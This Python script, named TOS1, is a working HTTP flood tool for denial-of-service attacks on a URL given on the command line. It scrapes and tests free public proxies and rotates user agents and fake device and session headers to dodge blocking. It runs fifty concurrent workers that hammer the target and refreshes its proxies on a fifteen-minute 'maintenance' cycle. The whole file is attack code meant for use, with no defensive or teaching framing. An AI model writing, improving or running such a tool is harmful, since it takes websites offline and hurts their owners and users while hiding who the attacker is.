import aiohttp
import asyncio
import random
import time
import os
import sys
from datetime import datetime

class TOS1:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session_id = "S023"
        self.total_requests = 0
        self.proxies = []
        self.user_agents = []
        self.headers_list = []
        self.device_ids = []
        self.session_ids = []
        
        # Performance tracking
        self.start_time = time.time()
        self.last_display_update = time.time()
        self.requests_since_update = 0
        
        # Maintenance
        self.last_maintenance = time.time()
        self.maintenance_interval = 900  # 15 minutes
        self.maintenance_duration = 30   # 30 seconds maintenance
        self.attack_active = False
        
        # Control
        self.running = True
        
        # Load UAs from file
        self.load_user_agents()
        
    def load_user_agents(self):
        try:
            with open('ua.txt', 'r') as f:
                self.user_agents = [line.strip() for line in f if line.strip()]
        except:
            # Fallback UAs if file not found
            self.user_agents = [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
                'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1'
            ]
    
    async def fetch_proxies(self):
        """Fetch proxies before attack starts"""
        print(f"[{datetime.now().strftime('%H:%M:%S')}] Fetching proxies...")
        url = "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&protocol=http&proxy_format=ipport&format=text&timeout=20000"
        
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(url, timeout=30) as response:
                    if response.status == 200:
                        text = await response.text()
                        raw_proxies = [p.strip() for p in text.split('\n') if p.strip()]
                        self.proxies = [f"http://{p}" for p in raw_proxies]
                        print(f"[{datetime.now().strftime('%H:%M:%S')}] Loaded {len(self.proxies)} proxies")
                    else:
                        print(f"[{datetime.now().strftime('%H:%M:%S')}] Failed to fetch proxies")
        except Exception as e:
            print(f"[{datetime.now().strftime('%H:%M:%S')}] Proxy fetch error: {str(e)}")
    
    def generate_headers(self):
        """Generate realistic headers"""
        base_headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Cache-Control': 'max-age=0',
        }
        return base_headers
    
    def rotate_identifiers(self):
        """Generate new IDs"""
        self.device_ids = [f"DEV{random.randint(10000, 99999)}" for _ in range(100)]
        self.session_ids = [f"SESS{random.randint(100000, 999999)}" for _ in range(100)]
        self.headers_list = [self.generate_headers() for _ in range(100)]
    
    async def check_proxy(self, proxy):
        """Test if proxy is working"""
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(self.target_url, proxy=proxy, timeout=5) as response:
                    return response.status < 500
        except:
            return False
    
    async def test_proxies(self):
        """Test all proxies and keep only working ones"""
        if not self.proxies:
            return
        
        print(f"[{datetime.now().strftime('%H:%M:%S')}] Testing {len(self.proxies)} proxies...")
        
        tasks = []
        for proxy in self.proxies:
            tasks.append(self.check_proxy(proxy))
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        working_proxies = []
        for i, result in enumerate(results):
            if result is True:
                working_proxies.append(self.proxies[i])
        
        self.proxies = working_proxies
        print(f"[{datetime.now().strftime('%H:%M:%S')}] {len(self.proxies)} proxies working")
    
    async def send_request(self, session, proxy, headers):
        """Send single request through proxy"""
        try:
            async with session.get(self.target_url, headers=headers, proxy=proxy, timeout=10) as response:
                await response.read()
                return True
        except:
            return False
    
    async def attack_worker(self, worker_id):
        """Worker that sends requests"""
        connector = aiohttp.TCPConnector(limit=100, ttl_dns_cache=300)
        
        async with aiohttp.ClientSession(connector=connector) as session:
            while self.running:
                if not self.attack_active:
                    await asyncio.sleep(0.01)
                    continue
                
                if not self.proxies:
                    await asyncio.sleep(0.1)
                    continue
                
                # Rotate everything
                proxy = random.choice(self.proxies)
                headers = random.choice(self.headers_list) if self.headers_list else {}
                headers['User-Agent'] = random.choice(self.user_agents)
                
                if self.device_ids:
                    headers['X-Device-ID'] = random.choice(self.device_ids)
                if self.session_ids:
                    headers['X-Session-ID'] = random.choice(self.session_ids)
                
                success = await self.send_request(session, proxy, headers)
                
                self.total_requests += 1
                self.requests_since_update += 1
                
                # Small delay to prevent overwhelming
                await asyncio.sleep(0.001)
    
    def update_display(self):
        """Update display with overwriting"""
        current_time = time.time()
        
        if current_time - self.last_display_update >= 0.001:  # Every millisecond
            elapsed = current_time - self.last_display_update
            current_rps = self.requests_since_update / elapsed if elapsed > 0 else 0
            
            sys.stdout.write(f"\rTØS-TRS — {self.total_requests} | {{{self.session_id}, TØS-RR}}")
            sys.stdout.flush()
            
            self.requests_since_update = 0
            self.last_display_update = current_time
    
    def check_maintenance(self):
        """Check if maintenance is needed"""
        current_time = time.time()
        
        if current_time - self.last_maintenance >= self.maintenance_interval:
            print(f"\n[{datetime.now().strftime('%H:%M:%S')}] MAINTENANCE STARTED")
            self.attack_active = False
            
            # Clear junk
            self.proxies.clear()
            self.rotate_identifiers()
            
            # Schedule resume
            asyncio.create_task(self.perform_maintenance())
            
            self.last_maintenance = current_time
    
    async def perform_maintenance(self):
        """Perform maintenance tasks"""
        await asyncio.sleep(self.maintenance_duration)
        
        # Refresh everything
        await self.fetch_proxies()
        await self.test_proxies()
        self.rotate_identifiers()
        
        print(f"[{datetime.now().strftime('%H:%M:%S')}] MAINTENANCE COMPLETE")
        self.attack_active = True
    
    async def start(self):
        """Main attack loop"""
        # Initial display
        print("𝖳Ø𝖲-1 | 𝖲023")
        await asyncio.sleep(2)
        os.system('clear' if os.name == 'posix' else 'cls')
        
        # 1 minute preparation
        print(f"[{datetime.now().strftime('%H:%M:%S')}] Preparing attack (60s)...")
        
        start_prep = time.time()
        await self.fetch_proxies()
        await self.test_proxies()
        self.rotate_identifiers()
        
        # Wait until 60 seconds total prep time
        prep_elapsed = time.time() - start_prep
        if prep_elapsed < 60:
            await asyncio.sleep(60 - prep_elapsed)
        
        print(f"[{datetime.now().strftime('%H:%M:%S')}] STARTING ATTACK")
        self.attack_active = True
        
        # Start multiple workers
        workers = []
        for i in range(50):  # 50 concurrent workers
            workers.append(asyncio.create_task(self.attack_worker(i)))
        
        # Main loop
        try:
            while self.running:
                self.update_display()
                self.check_maintenance()
                await asyncio.sleep(0.001)  # 1ms sleep
        except KeyboardInterrupt:
            self.running = False
            print("\n\n=== ATTACK STOPPED ===")
        finally:
            # Cleanup
            for worker in workers:
                worker.cancel()
            
            print(f"\nTotal Requests: {self.total_requests}")
            print(f"Runtime: {time.time() - self.start_time:.1f}s")

async def main():
    if len(sys.argv) < 2:
        print("Usage: python tos1.py https://target.com")
        return
    
    target = sys.argv[1]
    attack = TOS1(target)
    await attack.start()

if __name__ == "__main__":
    asyncio.run(main())
